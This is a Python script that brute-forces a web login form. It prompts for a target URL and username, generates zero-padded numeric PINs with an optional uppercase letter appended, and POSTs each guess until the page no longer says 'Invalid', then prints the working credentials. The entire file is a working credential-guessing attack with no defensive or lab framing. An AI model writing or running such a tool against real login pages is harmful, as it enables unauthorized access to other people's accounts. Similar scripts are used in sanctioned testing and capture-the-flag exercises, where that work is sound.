import requests
import string

url = input("Enter URL:")
username = input("Enter username:")

#generate numeric passwords
count = int(input("Enter digit count:"))
alphabet = list(string.ascii_uppercase)

def options():
        choice = input("Select 1 for numbers only \n Select 2 for numbers and letters")

        if choice == "1":
                return  [str(i).zfill(count) for i in range(10000)]
        elif choice == "2":
                return  [str(i).zfill(count) + letter for i in range(10000) for letter in alphabet]
        else:
                print("Invalid option")
                return[]

#alphabet = list(string.ascii_uppercase)

#password_list = [str(i).zfill(count) for i in range(10000)]
#password_list = [str(i).zfill(count) + letter for i in range(10000) for letter in alphabet]

def brute_force(password_list):
        for password in password_list:
                data = {"username": username, "password": password}
                response = requests.post(url, data=data)

                if "Invalid" not in response.text:
                        print(f" Found valid credentials: {username}:{password}")
                        break
                else:
                        print(f" Attempted: {password}")


password_list = options()
if password_list:
        brute_force(password_list)




